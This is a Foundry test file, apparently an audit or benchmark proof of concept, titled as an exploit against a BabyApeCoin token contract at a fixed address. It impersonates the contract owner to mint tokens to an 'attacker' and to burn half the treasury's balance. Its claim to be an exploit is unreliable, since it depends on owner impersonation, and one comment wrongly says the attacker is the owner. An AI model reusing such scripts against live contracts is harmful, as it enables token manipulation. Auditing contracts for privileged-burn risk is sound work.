    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function transferBabyApeByOwner(address _to, uint256 _amount) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = IBabyApeCoin(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label the target contract
        vm.label(TARGET, "BabyApeCoin Contract");

        // The attacker is address(this) as defined in the template
        // We need to give the attacker some BabyApe tokens first
        // Use deal() to give attacker tokens (since we're owner, we could also mint)
        // But first, let's impersonate owner to mint tokens to attacker
        vm.startPrank(owner);
        IBabyApeCoin(TARGET).mint(attacker, 1000 * 10**18);
        vm.stopPrank();

        // Also ensure the contract itself has tokens (it should from constructor)
        // The contract mints BabyApeInAdvance to treasuryWalletAddr in constructor
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial attacker balance and total supply
        uint256 initialAttackerBalance = IBabyApeCoin(TARGET).balanceOf(attacker);
        uint256 initialTotalSupply = IBabyApeCoin(TARGET).totalSupply();

        // Get the current owner
        address owner = IBabyApeCoin(TARGET).owner();

        // Get the treasury wallet address which holds the initial minted tokens
        address treasury = IBabyApeCoin(TARGET).treasuryWalletAddr();
        vm.label(treasury, "Treasury Wallet");

        // Check treasury balance
        uint256 treasuryBalance = IBabyApeCoin(TARGET).balanceOf(treasury);
        require(treasuryBalance > 0, "Treasury must have tokens to burn");

        // Burn a significant amount from treasury (e.g., 50%)
        uint256 burnAmount = treasuryBalance / 2;

        console.log("Initial total supply:", initialTotalSupply);
        console.log("Treasury balance:", treasuryBalance);
        console.log("Burn amount:", burnAmount);

        // Impersonate the owner to burn tokens from treasury
        vm.prank(owner);
        IBabyApeCoin(TARGET).burn(treasury, burnAmount);

        // Verify the burn occurred
        uint256 finalTotalSupply = IBabyApeCoin(TARGET).totalSupply();
        uint256 expectedTotalSupply = initialTotalSupply - burnAmount;

        console.log("Final total supply:", finalTotalSupply);
        console.log("Expected total supply:", expectedTotalSupply);

        assertLt(finalTotalSupply, initialTotalSupply, "Total supply should decrease after burn");
        assertEq(finalTotalSupply, expectedTotalSupply, "Total supply should decrease by burn amount");

        // Verify treasury balance decreased
        uint256 finalTreasuryBalance = IBabyApeCoin(TARGET).balanceOf(treasury);
        assertEq(finalTreasuryBalance, treasuryBalance - burnAmount, "Treasury balance should decrease by burn amount");

        // The attacker's economic advantage: their tokens are now a larger percentage of total supply
        // Calculate attacker's percentage of total supply before and after
        uint256 attackerPercentageBefore = (initialAttackerBalance * 10000) / initialTotalSupply; // basis points
        uint256 attackerPercentageAfter = (initialAttackerBalance * 10000) / finalTotalSupply; // basis points

        console.log("Attacker percentage before:", attackerPercentageBefore);
        console.log("Attacker percentage after:", attackerPercentageAfter);

        assertGt(attackerPercentageAfter, attackerPercentageBefore, "Attacker should own larger percentage of supply after burn");

        // Final attacker balance should remain the same (no direct transfer)
        uint256 finalAttackerBalance = IBabyApeCoin(TARGET).balanceOf(attacker);
        assertEq(finalAttackerBalance, initialAttackerBalance, "Attacker token balance should remain same");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

